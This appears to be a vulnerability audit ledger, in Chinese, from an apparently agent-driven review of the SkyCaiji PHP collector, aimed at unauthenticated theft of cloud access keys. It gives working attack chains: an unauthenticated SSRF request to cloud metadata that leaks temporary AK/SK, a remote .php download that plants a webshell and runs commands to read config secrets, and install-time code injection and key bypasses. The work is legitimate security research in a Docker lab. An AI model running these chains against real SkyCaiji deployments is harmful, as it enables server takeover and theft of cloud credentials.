# SkyCaiji 安全审计台账 (findings.md)

> 目标：未认证 0-click 且可泄漏 AK/SK 的漏洞。最终 Docker 复现。
> 框架：ThinkPHP 5.0.x 定制版 ("tp 1.2 skycaiji")，应用代码位于 `vendor/skycaiji/app/`。

## 框架专属字典 (建设中)
- 入口文件: `index.php` -> `vendor/skycaiji/tp/start.php`
- 应用命名空间: `skycaiji`
- 模块: `admin`(需认证), `api`(未认证?), `index`, `install`, `common`, `Release`
- 路由 (route.php):
  - `api_task/:id/[:key]` -> `admin/api/task`
  - `api_single/:id/[:key]` -> `admin/api/single`
  - `api_caiji` -> `admin/api/caiji`
  - `api/data/:i` -> `api/data/index`
- app_init behavior: `skycaiji\common\behavior\Init` (无强制鉴权，仅 session_start + url 兼容)
- source 取法: `input('param.')`, `$_GET`, `$_POST`, `$_SERVER`, 路由变量
- sink: TP5 Db/Query (`where`/`query`), 模板引擎, 文件操作, `unserialize`, 命令执行

## AK/SK 存储点 (待定位)

## 意图 (Intents / 假设) 队列
- [进行中] I1: `api/Data::indexAction` 未认证, `do_query_conds` 是否 SQLi / 可读任意数据
- [ ] I2: `admin/Api` 路由 (api_task/api_single/api_caiji) 是否可绕过认证
- [ ] I3: 定位 AK/SK 的存储 + 是否有未认证读取路径
- [ ] I4: install 模块是否可重装 / 泄漏配置
- [ ] I5: ThinkPHP 5.0.x n-day (RCE/SQLi) 是否版本命中且可达

## 已确认事实 (Facts) — 框架级
- **F1 [认证门禁] admin 模块的 `index` 与 `api` 控制器免登录可达。**
  - `admin/behavior/Init::run()` (admin/behavior/Init.php:77-101): 非管理员访问时，仅当 `!in_array($curController,['index','api'])` 才 `dispatchJump(false,...)` 拒绝。即 **`admin/index/*` 与 `admin/api/*` 全部动作对未认证用户开放**。
  - `admin/controller/BaseController::_initialize()` (BaseController.php:15-24): 仅在 POST 且控制器!=api 时校验 `_usertoken_`（类 CSRF），**完全不校验是否登录**。
  - 路由(route.php): `api_task/:id/[:key]`→admin/api/task，`api_single/:id/[:key]`→admin/api/single，`api_caiji`→admin/api/caiji。`url_route_must=false`，故 `?s=/admin/api/xxx`、`?s=/admin/index/xxx` 任意可达 (config.php:87)。
- **F2 [机密存储] config 表存放 AK/SK 级机密**，加载进全局 `g_sc('c')`（admin Init 对 api/index 也执行）。
  - keys: `translate`(百度/腾讯翻译 appid/key、SecretId/SecretKey，见 Translator.php:231/307/308)、`email`(SMTP 口令)、`proxy`、`download_img`/`download_file`(存储/发布插件凭据)、`admincp`(云平台通信authkey)。
  - 存储: `Config` 模型 (common/model/Config.php)，`cname`→`data`(serialize)。`getConfig`/`cacheConfigList`。
- **F3 [输入过滤] 全局默认过滤 `default_filter_func`=htmlspecialchars(ENT_QUOTES)** (config.php:35, common.php:163)。`input()` 取值会被 HTML 实体化（`'`→`&#039;`）。但直接读 `$_GET/$_POST/$_REQUEST/$_SERVER` 可绕过。对 SQLi：实体化会破坏引号闭合，需找直接超全局或数字/标识符位注入。
- **F4 [密钥强度] 内部触发密钥不可预测**：`\util\Funcs::uniqid()=md5(uniqid()+microtime()+rand(1,1e6))` (Funcs.php:321)。故 proc_open_exec/swoole_server/auto_clear/collect_process/auto_collect 等命令执行类端点非未认证可达（需管理员预置 + 一次性缓存密钥）。
- **F5 [反序列化] `safe_unserialize`** (common.php:479) 仅拦 `O:\d+:"..."`，不拦 `C:`(Serializable) 与数组；但 TP5 常见 gadget 走 `O:`。

## 未认证可达动作清单（0-click 候选）
- `api/data/index` (api/Data.php): 需存在 Dataapi 记录(管理员配置)；`do_query_conds` 查询 dataset 表，`where($f,$op,$val)` 为参数化；field/op 来自配置。→ 主要泄漏数据集数据，非 AK/SK，除非 SQLi。
- `admin/index/{login,encrypt_config,verify,find_password,caiji,auto_backstage,auto_collect,auto_clear,collect_process,proc_open_exec,swoole_server,cli}`：命令执行/采集类均 key 门禁(F4)或需开启配置。login/find_password 可枚举用户。
- `admin/api/{task,single,caiji,clientinfo,certificate,store_update,page_render}`：task/single 需任务存在+key；caiji 需开启；certificate/store_update 需 authsign；clientinfo 仅回显 url+版本。

## 已确认事实 — 框架加固（排除项，供覆盖度）
- **F1 复核OK**：`admin/tags.php` 以 `module_init => ['skycaiji\admin\behavior\Init']` 注册鉴权钩子；App.php:590 先 set controller 再 App.php:593 `Hook::listen('module_init')`，故钩子内 `request()->controller()` 已就绪；对 `index`/`api` 放行成立。
- **F6 [TP5 控制器名 RCE 已封堵]** App.php:575 `preg_match('/^[A-Za-z](\w|\.)*$/',$controller)`，`\w` 不含 `\`，经典 `s=index/\think\app/invokefunction` 被拒 (404)。
- **F7 [TP5 _method 属性覆盖 RCE 已封堵]** Request.php:524-531 `var_method` 覆盖仅白名单 `[GET,POST,DELETE,PUT,PATCH]`，`__construct` 被拒。
- **F8 [重装已封堵]** install/controller/Index.php:19-26 构造函数检测 `data/install.lock`，存在即 success 跳转退出；但首次未安装时 install/* 可达（部署前）。
- **F9 [默认配置闭合]** install_table 仅种入 config: `version/caiji/site`。`caiji.api` 未设→`admin/api/caiji` 拒绝；`page_render_api_key` 未设→`admin/api/page_render` 拒绝；`caiji.auto=0`→`admin/index/caiji` 拒绝。故这些 out-of-box 关闭。
- **F10 [PDO 模拟预处理]** install/Index.php:252 `PDO::ATTR_EMULATE_PREPARES=>true`（影响 SQLi：模拟预处理下部分注入/多语句行为不同）。database.php `debug=true`，app_debug=false，exception_handle=CommonHandle（非 collecting 时走 TP 默认错误页）。

## 环境/复现就绪
- PHP 8.3.6 可用；Docker daemon 已启动、可经代理拉取镜像（hello-world 成功）。复现将用 Docker(php+mysql) 正常安装系统，并种入带假 AK/SK 的 config 以演示泄漏。

## 子代理结论汇总
- **[SSRF 维度 - 完成]** SSRF 原语零防护（util/Curl.php: FOLLOWLOCATION+手动跟随3xx，无协议/host/IP 白名单，支持 file://、gopher://），但**所有「攻击者可控URL→get_html/ChromeSocket」入口均需管理员认证**（Tool::preview、Proxy::testApi、Release::toapiApp、Provider::save、Develop::apiTest）。免登录的 admin/index、admin/api、api/data **无**可控URL外连点。→ **未认证 SSRF 未确认**；确认的是「管理员态 Tool::previewAction(Tool.php:887-906, sink:896) → `data=http://100.100.100.200/latest/meta-data/...` 读阿里云临时AK/SK 或 `data=file:///.../data/config.php` 读DB账密」。
- **[TP5 框架层 - 完成]** 经典 n-day 全部修补/不可未认证触发：控制器名正则(App.php:575)堵 `\think\app` RCE；`_method` 白名单(Request.php:526)堵属性覆盖 RCE；filter 回调不可控；DB Builder parseKey/parseOrder strict + EXP 要求 Expression 实例(Builder.php:393) + insert/update parseData 拒 exp(Builder.php:127) → 框架层无注入。app_debug=false 故异常页不泄漏(除非误开)。**框架层拿不到 AK/SK，须走应用层。**
- **[action 机制]** action_suffix='Action'(config.php:60)，仅 `xxxAction` 公有方法可当 action；基类(Base/Collect)无 `*Action`，故未认证面=admin/Index+admin/Api 的 *Action + api/Data + index/Index + install/*。

## 次要发现（非 AK/SK，先记录）
- **[Low 信息泄漏] 未认证登录页泄漏 `admincp` 配置 + usertoken**：`admin/view/index/index.html:1` include `common:header_public`，`header_public.html:50` 输出 `admincp:{:json_encode(g_sc_c('admincp'))}` 与 `usertoken:{:g_sc('usertoken')}`。登录页免登录(F1)。但 admincp 仅含 UI 偏好(skin/mini/newwin/fixed/narrow/check_skip，见 Backstage.php:577)，**非 AK/SK**；usertoken 为会话 CSRF token。价值低。

## 实弹环境 & F1 验证（Docker）
- 已用 Docker 真实安装运行：`skycaiji-php`(php7.4-apache) + `mysql:5.7`，访问 `http://127.0.0.1:8899`，表前缀 `sky_`，管理员 admin/admin888。
- 已向 `sky_config` 植入逼真假 AK/SK：translate(腾讯 secretid/secretkey、百度 appid/key)、email(SMTP password)、proxy(user/pwd)。
- **F1 实弹确认**：
  - `GET ?s=/admin/index/index`(登录页) 200 可达，响应含 `var site_config={...usertoken,clientinfo,admincp...}`。
  - `GET ?s=/admin/api/clientinfo` 200 → `{"url":...,"v":"3.1"}`（未认证）。
  - `GET ?s=/admin/setting/caiji` → "抱歉，请登录管理员账号！"（受保护控制器正确拦截）。
  → 证明：**仅 admin 的 index/api 控制器免登录，其余需登录**，F1 成立且边界清晰。

## 子代理结论汇总（续）
- **[机密直泄+反序列化+install - 完成]**
  - **A 机密直泄 = 确认否定**：所有免登录动作都不回显 translate/email/proxy/store 级机密。**修正 F2 假设**：云平台通信 authkey 实际在 `store` 配置组(Provider.php:85)，**不在 admincp**；admincp 仅 UI 偏好。header_public 泄漏的 admincp/clientinfo/usertoken 均非 AK/SK。
  - **B 反序列化 = 无未认证直达链**：api/index/install 模块无 unserialize；免登录可达的 safe_unserialize sink 全吃 DB/缓存服务端内容（需先有写原语）；攻击者原始字节→unserialize 的点全部需管理员登录。且本库无任何类 implements `Serializable`→`C:` 无 gadget；`O:` 被正则拦。
  - **C install**：
    - **C1 重装被 install.lock 拦**（install/Index.php:19-26 构造函数短路）。**但本 checkout 当前无 install.lock/无 config.php = 未安装态，install 流程当前可直接访问。**
    - **C2 [High, 安装期] step3 → data/config.php PHP 代码注入 → 持久 RCE**：step2 的 db_* 入 cache，step3 以 `str_replace('{$DB_PWD}',$v,模板)` 无转义写入单引号 PHP 串(install/Index.php:179-187)；payload 放 db_pwd（不参与SQL），指向攻击者可达的 MySQL 即稳定 getshell；config.php 每请求 include。→ RCE 可读全部 AK/SK。**条件：目标处于未安装态 + 攻击者 MySQL 可达。**
    - **C3 [Low] install/upgrade 免登录可达**（Upgrade.php 构造不检 lock），但仅 DDL/DML 迁移，非 getshell。
- **[auth 密钥学]** `User::generate_key = md5(lower(username).':'.password_hash)`（admin/model/User.php:124-131）。admin Init 对未认证 api/index 仍执行 login_history cookie 自动登录(Init.php:23-38)，但伪造 cookie 需知道存储的 password hash → 无读原语时不可伪造。→ **非独立漏洞；但若有读 user 表的 SQLi，则 SQLi→取hash→伪造cookie→管理员→AK/SK 成链。**

## 子代理结论（SQLi 完成）
- **[SQLi 维度 - 完成]** 无可读 config/user 的注入（认证与否均无）。定制 TP5 加固 parseKey 严格正则/parseOrder 方向白名单/IN-BETWEEN 绑定/EXP 需 Expression。唯一 suspected S1(json_extract parseKey 旁路, Mysql.php:98-101) 被锁死在数据集自表 ORDER BY/WHERE 且禁含 `(`，读不到 config/user，且需 admin 预置。→ SQLi 出局。

---
# ★ 主漏洞（已确认 + 实弹复现）★
## V1 [Critical] 未认证 0-click SSRF → 云元数据 → 泄漏临时 AK/SK（单页采集接口）
- **类别**：SSRF（未认证）→ 云 STS 临时凭据(AccessKeyId/AccessKeySecret/SecurityToken) 泄漏；亦可打内网/端口扫描。
- **可达性**：未认证、0-click（单个 GET）。**前置条件**：存在一个 `module=pattern` 且开启"单页采集"(`single.open=1`) 的任务；当 `single.key` 为空时完全无需任何凭据（单页采集接口本就是设计给外部系统调用的，空密钥是常见配置）。设了 key 则需 `md5(single.key)`（该 key 随 URL 传输，易泄漏于日志/Referer）。
- **完整数据流**：
  1. 路由 `api_single/:id/[:key]` → `admin/api/single` (route.php:3)。
  2. admin 鉴权钩子对 `api` 控制器放行（F1：admin/behavior/Init.php:95）；`BaseController::_initialize` 对 api 控制器跳过 usertoken（BaseController.php:20）→ **未认证可达**。
  3. `Api::singleAction` (admin/controller/Api.php:67-141)：校验任务存在、`single.open`、`single.key`(空则跳过) → `CpatternSingle`。
  4. `CpatternSingle::collectSingle` (CpatternSingle.php:19) **`$curUrl=input('url')`（攻击者完全可控）**；29/34 行 `source_url`/`levelN_url` 同样可控。
  5. → `loadSingle`→`getFields($curUrl)` (Cpattern.php:1278, URL 仅需匹配 `^\w+://`) → `get_page_html` (CpatternColl.php:1575) → `get_html` (common.php:217) → `\util\Curl`（**零 SSRF 防护**：无 host/IP/协议白名单，跟随 302，SSRF 子代理已证）。
  6. 字段提取：`dvalue` 模块直接 `$val=$html`（set_field_val, CollectCommon.php:2663-2665）→ **抓取到的整页响应体原样回显**给未认证调用者；`jsonSend('',$data,1)`。
- **反证排除**：无需 cookie/session（实测 T1）；GET 不触发 usertoken；`single.key` 空时无密钥（实测 T2：空/错 key 均"接口密钥错误"，`md5(key)` 正确才过——印证前置条件）；URL 无内网/协议过滤（直连 http://sc-meta 成功）。
- **实弹 PoC（已复现）**：
  - 环境：Docker `sc-app`(skycaiji 3.1, php7.4) + `sc-db`(mysql5.7) + `sc-meta`(内网伪云元数据，返回 STS 临时AK/SK)。任务 id=1：pattern+single.open=1+空key+一个 `dvalue` 字段(模拟"单页采集API"配置)。
  - 请求（**无任何认证**）：`GET http://127.0.0.1:8899/index.php/api_single/1?url=http://sc-meta/latest/meta-data/ram/security-credentials/myrole`
  - 响应：`{"code":1,"msg":"","data":[{"content":{"name":"content","value":"{\"AccessKeyId\":\"STS.FAKE...\",\"AccessKeySecret\":\"FAKEsk_...\",\"SecurityToken\":\"...\"}"...}}]}` → **完整临时 AK/SK 回显**。
- **攻击链**：泄漏的云 STS 临时 AK/SK → 调用对应云 API（OSS/ECS/RAM 等）→ 视权限横向到云资产。
- **局限/说明**：`file://` 本地文件读经此路径不可用（`get_html` 以 HTTP 200 判 `$curl->ok`，file:// http_code=0→返回空；libcurl 本身支持 file:// 但被状态判定挡住）。内容回显依赖任务字段：`dvalue`/宽泛 regex/`//*` xpath 回显整页；站点专用窄规则则为**盲 SSRF**（仍可打内网/探测/触发内网API）。

## 次要/支撑发现
- **V2 [Medium] 认证绕过（F1）**：`admin/index/*`、`admin/api/*` 免登录（admin/behavior/Init.php:95 + BaseController.php:20）。本身是上面 V1 的可达性基础；其余免登录 action 多被 per-feature key/开关门控。实测：登录页/clientinfo 可达，setting 被拦。
- **V3 [High, 仅未安装态] install step3 → data/config.php PHP 代码注入 RCE（C2）**：install/Index.php:179-187 `str_replace('{$DB_PWD}',$v,单引号模板)` 无转义；payload 置于 db_pwd（指向攻击者可达 MySQL）→ 写入 config.php→每请求 include→RCE→读全部机密。条件：目标处于未安装态（新部署窗口；本 checkout 原始即未安装态）。

## 已覆盖维度
(建设中)

---
# 第二轮「升级」审计（Workflow, 8 维度 → 对抗验证）—— 目标: 超越临时STS的持久化影响

## ★ V4 [Critical, 已实弹复现] 未认证 → 文件本地化任意 .php 落盘 → webshell/RCE → 永久凭据
- 入口同 V1(未认证单页采集 admin/api/single)，但走**文件本地化(download_file)**后置流水线 → 持久化 RCE。
- 数据流: input('url')(CpatternSingle.php:19) → dvalue 整页(CollectCommon.php:2663) → is_file 正则提取裸URL入 field['file'](CollectCommon.php:2002-2011) → 发布 get_field_val→download_file(ReleaseBase.php:154-182) → 后缀无白名单(Funcs.php:474, ReleaseBase.php:688-690) → write_dir_file data/files/<date>/<md5>.php(ReleaseBase.php:782, common.php:107)。
- 可执行: data/files/ 无 .htaccess(对比 data/program/.htaccess=deny)；根 .htaccess `!-f` → 已存在 .php 直接交 Apache 执行。路径=md5(文件URL)可预测。
- 前置(运营者配置, 均现实可见): pattern单页(open=1,key='') + download_file开 + 字段 download/is_file 处理步 + 非api发布模块。
- **实弹**: GET /index.php/api_single/1?url=http://metadata.internal/p → 落 data/files/2026-10-07/711d03aae2b9484044705730ea25be62.php；GET 该php?c=id → uid=33(www-data)；?c=cat .../data/config.php → DB root 账密；再用其读 config 表 translate/email/proxy 永久密钥。
- 复现: security-poc/run-rce.sh (compose up 后一键)。
- 对抗验证: 3/3 (reachability/dataflow/impact 全 CONFIRMED, 影响超越临时STS)。

## 第二轮其余发现(源码已确认 / 待复验)
- [源码确认] util/Curl 无 CURLOPT_PROTOCOLS/REDIR_PROTOCOLS + FOLLOWLOCATION=1(Curl.php:87-94) → 未认证可发任意libcurl协议打内网(gopher→Redis/FastCGI盲写); 非HTTP因get_html以200判成功而盲。
- [源码确认] admin/api/task 密钥绕过: elseif($apiKey==md5($apiConfig['key']))(Api.php:35), 任务api发布空密钥时发 md5('')=d41d8cd9… 绕过 → 未认证触发任务自身采集+发布(URL非攻击者直控)。中危。
- [待复验] 单页采集DB异常message回显→泄漏库名/表前缀/列名/DB用户@主机(不含口令)。
- [待复验] find_password 泄漏表前缀+已知口令skycaiji123的有效hash+(邮件失败)SMTP主机/账号; 不泄漏当前hash/salt→不足以伪造cookie。
- [待复验] Rfile 实时发布写 data/ 可控文件(扩展名限txt/xls/xlsx); Rdb/Rcms/Rdatahub/Rdataset 下游内容注入。
- [待复验] Rdiy(type=code) eval 管理员PHP, 攻击者可控$url/$fields入eval作用域(条件RCE放大器)。
- [待复验] 二次入库: 单页采集→dataset/datahub→api/data读回, 构成通用未认证内网HTTP响应读取原语。
- [源码确认-当前不可利用] ApiApp _op_variable_func call_user_func_array 无白名单, 但函数名由插件_ops定义非外部可控且无内置插件。

## 定级修正
- 头号漏洞由 V1(临时STS) 升级为 **V4(持久化RCE→永久凭据)**。V1 降为并列Critical但影响短效。
- 注: 第二轮对抗验证阶段因会话速率限制中断(34 agent失败), "待复验"项为finder已完成、我已核对关键断言但未独立对抗复核者; V4 已完成3/3验证+实弹。

---
# 第三轮审计（Workflow, 3 维度）—— 目标: 无条件(默认全新安装)未认证泄漏云AK/SK

## 结论: ✗ 不存在无条件未认证云AK/SK泄漏（已穷举证伪）
默认安装仅种 config 的 version/caiji/site，无任何 task/dataapi/云凭据配置。所有"无条件"未认证原语均为无害死胡同；所有能触及 AK/SK 的路径都需运营者预置(V1/V4的单页采集任务、store插件表导入、或登录)。

### 本轮新确认的【无条件未认证】原语（但不泄漏AK/SK）
- **V5 [Medium] authsign 鉴权绕过（无条件）**: admin/api store_update / certificate 依赖 Provider::storeAuthResult(Provider.php:150)。全新安装 store 密钥空→getAuthkey(null)=''(Provider.php:74-87)→createAuthsign(Provider.php:102)各分量(authkey=''/client_domain=Host头/store_domain=攻击者/timestamp)全可伪造; store_url=https://www.skycaiji.com 过 is_official_url(allow_origins, config.php:253); timestamp 需 now±1000s。→ 未认证绕过成立(provider_id=0)。**但解锁的 store_update/certificate 仅回显 url/version/uptime**: column('uptime','app')/app_class(...,'version') 投影不含 config 列(Api.php:262-298, App.php:69) → 无AK/SK、无写原语。
- **V6 [Low] 运行时文件 web 可直读**: runtime/、data/ 无 deny .htaccess(对比 data/program/.htaccess=deny)，根 .htaccess `!-f` 使已存在文件直接由 Apache 服务。→ runtime/log/<YYYYMM>/<DD>.log(路径按日期可猜)可未认证读。**但不含AK/SK**: app 配置 log.level=['error'](config.php:165)覆盖默认→SQL('sql'级)被过滤不入日志(Connection.php:973)，仅error行。

### 已证伪的候选（覆盖度）
- 配置缓存文件 runtime/cache/<md5('cache_config_all')>.php 明文含全量机密(含云AK/SK)且路径可预测——但 TP5 File 缓存前置 `<?php ...exit();?>`(cache/driver/File.php:158)，web 执行返回空；无未认证 raw/LFR 读通道 → ✗。
- login-fail 限流缓存写(sky_cache_login)、encrypt_config 缓存写: 无条件但内容服务端构建/随机，永不作为可信配置读回 → ✗ 写原语。
- login_history 自动登录 cookie: generate_key=md5(username:password_hash) 需存储口令hash，无任何无条件点泄漏之 → ✗ 伪造。
- proc_open_exec/swoole_server/collect_process 命令执行: 均 cache-key/开关门禁，密钥 md5(uniqid+microtime+rand) 不可预测且无未认证写入点 → ✗。
- authsign 绕过后的 addon 安装写路径在登录门后 → ✗ 无条件。
- 未认证 SQLi(login/find_password/store_update $storeAddons): 参数化/column投影/IN绑定 → ✗。

### realistic 最大未认证影响(非无条件, 但真实部署常见)
- V4(RCE→全部永久凭据) 与 V1(SSRF→临时STS): 需运营者启用"单页采集"(V1)及"文件本地化+发布"(V4)的任务——这是使用该采集器的常见配置，但不是零配置。
